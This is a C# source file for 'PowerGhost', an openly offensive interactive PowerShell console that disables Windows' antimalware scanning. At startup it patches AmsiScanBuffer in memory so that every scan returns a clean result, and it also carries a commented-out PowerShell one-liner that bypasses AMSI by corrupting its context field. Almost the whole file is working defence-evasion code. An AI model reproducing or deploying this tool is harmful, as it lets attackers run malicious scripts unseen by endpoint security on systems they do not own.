using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;

namespace PowerGhost
{
    class Program
    {
        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        struct Delegates
        {
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate
            Int32 AmsiScanBuffer(IntPtr amsiContext, IntPtr buffer, UInt64 length, string contentName, IntPtr amsiSession, out UInt32 result);
        };

        static void HookAmsi()
        {
            // return AMSI_RESULT_CLEAN
            byte[] retOne = new byte[] { 0xC2, 0x01, 0x00 };

            unsafe 
            {
                fixed (byte* ptr = retOne)
                {
                    // copy the shellcode to memory and make executable
                    IntPtr memoryAddress = (IntPtr)ptr;
                    VirtualProtect(memoryAddress, (UIntPtr)3, 0x00000040, out UInt32 lpfOldProtect);
                    
                    // create the patch for the amsi call
                    byte[] patch = new byte[14] { 0xff, 0x25, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
                    byte[] funcAddress = BitConverter.GetBytes(memoryAddress.ToInt64());
                    Buffer.BlockCopy(funcAddress, 0, patch, 6, 8);

                    // get the AmsiScanBuffer address
                    IntPtr AmsiScanBufferAddress = GetProcAddress(GetModuleBaseAddress("amsi.dll"), "AmsiScanBuffer");
                    VirtualProtect(AmsiScanBufferAddress, (UIntPtr)14, (uint)0x00000040, out lpfOldProtect);

                    // patch it to point at our return AMSI_RESULT_CLEAN shellcode
                    Marshal.Copy(patch,0, AmsiScanBufferAddress, 14);
                }
            }
        }

        static void Main(string[] args)
        {
            // create and open a custom runspace
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            // associate the runspace with a powershell object
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            // this is the AMSI bypass
            //string bypass = "$a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like \"*iutils\") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like \"*Context\") {$f = $e}};$g = $f.GetValue($null);[IntPtr]$ptr = $g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);";

            Console.Title = "PowerGhost";
            Console.BackgroundColor = ConsoleColor.DarkRed;
            Console.ForegroundColor = ConsoleColor.White;
            Console.Clear();

            Console.WriteLine("\nPowerGhost by PlackyHacker");
            Console.WriteLine("--------------------------\n");
            Console.WriteLine("Type 'exit' to close.\n");

            Console.WriteLine("[+] Hooking AMSI for bypass...");
            ps.AddScript(";");
            ps.Invoke();

            HookAmsi();

            while (true)
            {
                Console.ForegroundColor = ConsoleColor.White;
                string dir = Directory.GetCurrentDirectory();

                Console.Write("PG " + dir + "> ");
                string input = Console.ReadLine();


                if (input.ToUpper() == "EXIT")
                {
                    break;
                }

                else if (input.ToUpper().StartsWith("CD"))
                {
                    try
                    {
                        Directory.SetCurrentDirectory(input.Split(' ')[1]);
                    }
                    catch (Exception ex) { Console.WriteLine(ex.Message); }
                }
                else if (string.IsNullOrEmpty(input))
                {
                    continue;
                }

                input = input.Trim();
                if (input.EndsWith(";")) input = input.Substring(0, input.Length - 1);

                if(input != "exit")
                    ps.AddScript(input + " | Out-String");



                try
                {
                    System.Collections.ObjectModel.Collection<PSObject> result = ps.Invoke();

                    if (result.Count > 0)
                    {
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        string str = result[0].BaseObject as string;
                        if (!String.IsNullOrEmpty(str))
                            Console.WriteLine(str.Substring(0, str.Length - 2));
                    }
                }
                catch(Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }

            // close the runspace
            rs.Close();
        }

        static IntPtr GetModuleBaseAddress(string name)
        {
            Process hProc = Process.GetCurrentProcess();

            foreach (ProcessModule m in hProc.Modules)
            {
                if (m.ModuleName.ToUpper().StartsWith(name.ToUpper()))
                    return m.BaseAddress;
            }

            // we can't find the base address
            return IntPtr.Zero;
        }
    }
}
